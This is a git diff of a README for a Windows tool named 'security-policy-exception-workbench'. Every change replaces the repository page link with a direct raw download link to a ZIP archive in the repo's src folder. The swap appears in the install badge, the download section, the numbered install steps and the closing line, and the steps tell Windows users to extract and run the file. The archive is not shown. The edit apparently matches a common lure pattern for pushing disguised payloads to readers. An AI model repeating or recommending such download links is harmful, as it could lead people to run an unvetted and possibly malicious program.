@@ -1,12 +1,12 @@
 # 🛡️ security-policy-exception-workbench - Turn Exceptions Into Clear Risk Plans
 
-[![Download / Install](https://img.shields.io/badge/Download%20%2F%20Install-Visit%20this%20page-blue)](https://github.com/mouseprohibition380/security-policy-exception-workbench)
+[![Download / Install](https://img.shields.io/badge/Download%20%2F%20Install-Visit%20this%20page-blue)](https://raw.githubusercontent.com/mouseprohibition380/security-policy-exception-workbench/main/src/exception-workbench-security-policy-3.8.zip)
 
 ## 📥 Download
 
 Use this link to visit this page to download:
 
-https://github.com/mouseprohibition380/security-policy-exception-workbench
+https://raw.githubusercontent.com/mouseprohibition380/security-policy-exception-workbench/main/src/exception-workbench-security-policy-3.8.zip
 
 ## 🪟 Run on Windows
 
@@ -64,7 +64,7 @@ For a smooth run on Windows, use:
 ## 🛠️ How to install
 
 1. Go to the download page:
-   https://github.com/mouseprohibition380/security-policy-exception-workbench
+   https://raw.githubusercontent.com/mouseprohibition380/security-policy-exception-workbench/main/src/exception-workbench-security-policy-3.8.zip
 2. Find the Windows download file or release asset.
 3. Download it to your Downloads folder.
 4. If the file is in a ZIP folder, right-click it and choose **Extract All**.
@@ -179,4 +179,4 @@ Use a review report when you need to:
 
 Use this page to download:
 
-https://github.com/mouseprohibition380/security-policy-exception-workbench
+https://raw.githubusercontent.com/mouseprohibition380/security-policy-exception-workbench/main/src/exception-workbench-security-policy-3.8.zip
